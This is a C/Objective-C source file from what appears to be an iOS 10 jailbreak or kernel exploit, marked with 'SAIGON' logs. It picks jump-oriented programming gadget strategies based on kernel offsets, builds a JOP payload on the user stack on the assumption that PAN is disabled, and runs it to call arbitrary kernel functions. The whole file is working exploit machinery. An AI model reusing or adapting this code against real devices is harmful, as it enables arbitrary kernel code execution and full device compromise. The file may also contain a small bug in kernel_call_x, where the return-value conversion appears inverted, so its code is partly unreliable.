/*
 * Copyright (c) 2017 Brandon Azad
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
#include "kernel_call.h"

#include "call_strategy.h"
#include "utility.h"

#include "rwx.h"
#include "offsets.h"

#include <assert.h>
#include <stdio.h>
#include <Foundation/Foundation.h>

/*
 * strategies
 *
 * Description:
 * 	A list of all available strategies, sorted in order of preference.
 */
const struct jop_call_strategy *strategies[] = {
	&jop_call_strategy_3,
	&jop_call_strategy_4,
};

/*
 * strategy
 *
 * Description:
 * 	The chosen strategy.
 */
const struct jop_call_strategy *strategy;

/*
 * choose_strategy
 *
 * Description:
 * 	Choose a compatible JOP strategy.
 */
kern_return_t
choose_strategy() {
    
    if(OFFSET(jop_GADGET_PROLOGUE_1) != 0 && OFFSET(jop_GADGET_POPULATE_1) != 0) {
        
        // 10.2.1
        strategy = &jop_call_strategy_3;
        NSLog(@"[SAIGON]: chose strategy 3 (assuming 10.2.1)\n");
        return KERN_SUCCESS;
        
    } else if(OFFSET(jop_GADGET_PROLOGUE_2) != 0 && OFFSET(jop_GADGET_POPULATE_2) != 0) {
        
        // 10.3.x
        strategy = &jop_call_strategy_4;
        NSLog(@"[SAIGON]: chose strategy 4 (assuming 10.3.1)\n");
        return KERN_SUCCESS;
    }
    
	
	NSLog(@"[SAIGON]: kernel_call: no available JOP strategy for the gadgets present in this kernel\n");
    
    
	return KERN_FAILURE;
}

/*
 * lay_out_arguments
 *
 * Description:
 * 	Fill the args64 array with the 64-bit arguments. The first 8 will be passed to the kernel
 * 	function in registers, while the remaining arguments will be passed on the stack according
 * 	to the format specified by Apple's ARM64 ABI.
 */
static bool
lay_out_arguments(uint64_t args64[32], size_t stack_size, unsigned arg_count,
		const struct kernel_call_argument args[]) {
	size_t i = 0;
	// Register arguments go directly.
	for (; i < arg_count && i < 8; i++) {
		args64[i] = args[i].value;
	}
	// Stack arguments get packed and aligned.
	uint8_t *stack = (uint8_t *) &args64[8];
	size_t stack_pos = 0;
	for (; i < arg_count && i < 32; i++) {
		// Insert any padding we need.
		size_t arg_align = lobit(args[i].size | 0x8);
		assert(args[i].size == arg_align); // size must be 1, 2, 4, or 8.
		stack_pos = round2_up(stack_pos, arg_align);
		// Check that the argument fits.
		size_t next_pos = stack_pos + args[i].size;
		if (next_pos > stack_size) {
			return false;
		}
		// Add the argument to the stack.
		pack_uint(stack + stack_pos, args[i].value, (unsigned) args[i].size);
		stack_pos = next_pos;
	}
	return (i == arg_count);
}

kern_return_t
kernel_call(void *result, unsigned result_size,
		uint64_t func, unsigned arg_count, const struct kernel_call_argument args[]) {
	assert(result != NULL || func == 0 || result_size == 0);
	assert(ispow2(result_size) && result_size <= sizeof(uint64_t));
	assert(arg_count <= 32);
    
	// Choose a strategy
	if (choose_strategy() != KERN_SUCCESS) {
		return KERN_FAILURE;
	}
    
	assert(strategy != NULL);
	// Build the arguments.
	uint64_t args64[32];
	size_t stack_size = strategy->stack_size;
	bool args_ok = lay_out_arguments(args64, stack_size, arg_count, args);
	// If the user is just asking if a specific call is supported, indicate that it is, as long
	// as the arguments all fit.
	if (func == 0) {
		return KERN_SUCCESS;
	}
	if (!args_ok) {
		NSLog(@"[SAIGON]: cannot call kernel function with %u arguments\n", arg_count);
		return KERN_FAILURE;
	}
	// Initialize unused bytes of the payload to a distinctive byte pattern to make detecting
	// errors in panic logs easier.
	size_t size = strategy->payload_size;
	assert(size <= 0x10000);
	uint8_t payload[size];
	memset(payload, 0xba, size);
	// Build the payload. We assume PAN is disabled, so we can specify the user-space stack
	// address of the payload as its kernel address.
	struct jop_call_initial_state initial_state;
	uint64_t result_address;
	strategy->build_jop(func, args64, (uint64_t)payload, payload, &initial_state,
			&result_address);
    
    // Debugging.
#define KERNEL_CALL_DEBUG_PAYLOAD TRUE
#define KERNEL_CALL_DEBUG_STACK TRUE
#define KERNEL_CALL_DEBUG_CALL TRUE
    
#if KERNEL_CALL_DEBUG_PAYLOAD
    for (size_t i = 0; i < size; i += sizeof(uint64_t)) {
        NSLog(@"[SAIGON]: payload[%04zx] = 0x%016llx\n", i, *(uint64_t *) &payload[i]);
    }
    NSLog(@"[SAIGON]: payload = 0x%llx\n", (uint64_t) &payload);
#endif
#if KERNEL_CALL_DEBUG_STACK
    for (size_t i = 0; i < stack_size / sizeof(uint64_t); i++) {
        NSLog(@"[SAIGON]: stack[%02zx] = 0x%016llx\n", i * sizeof(uint64_t), args64[i + 8]);
    }
#endif
#if KERNEL_CALL_DEBUG_CALL
    NSLog(@"[SAIGON]: function = 0x%llx\n", func);
    for (size_t i = 0; i < arg_count; i++) {
        NSLog(@"[SAIGON]: args[%zu] = 0x%llx\n", i, args[i].value);
    }
    
    NSLog(@"[SAIGON]: initial_state.pc: %llx\n", initial_state.pc);
    NSLog(@"[SAIGON]: initial_state.x[0]: %llx\n", initial_state.x[0]);
    NSLog(@"[SAIGON]: initial_state.x[1]: %llx\n", initial_state.x[1]);
    NSLog(@"[SAIGON]: initial_state.x[2]: %llx\n", initial_state.x[2]);
    NSLog(@"[SAIGON]: result_address %llx\n", result_address);
    NSLog(@"[SAIGON]: payload: %llx\n", (uint64_t)payload);

#endif

    
    sleep(3);
	// Execute the payload.
	kern_return_t kr = rwx_execute(initial_state.pc,
			initial_state.x[0], initial_state.x[1], initial_state.x[2]);
    
    // we _might_ fail but that's probably okay.
	if (kr != KERN_SUCCESS) {
		NSLog(@"[SAIGON]: ziVA rwx_execute() returned %x\n", kr);
    } else {
		NSLog(@"[SAIGON]: ziVA rwx_execute() returned %x\n", kr);
    }
	// Read the result from the payload buffer. Once again, we're assuming PAN is disabled.
	uint64_t result64 = *(uint64_t *)result_address;
	if (result_size > 0) {
		pack_uint(result, result64, result_size);
	}
	return KERN_SUCCESS;
}

kern_return_t
kernel_call_x(void *result, unsigned result_size,
		uint64_t func, unsigned arg_count, const uint64_t args[]) {
	assert(arg_count <= 14);
	struct kernel_call_argument xargs[14];
	for (size_t i = 0; i < arg_count; i++) {
		xargs[i].size  = sizeof(args[i]);
		xargs[i].value = args[i];
	}
    return kernel_call(result, result_size, func, arg_count, xargs) ? KERN_SUCCESS : KERN_FAILURE;
}
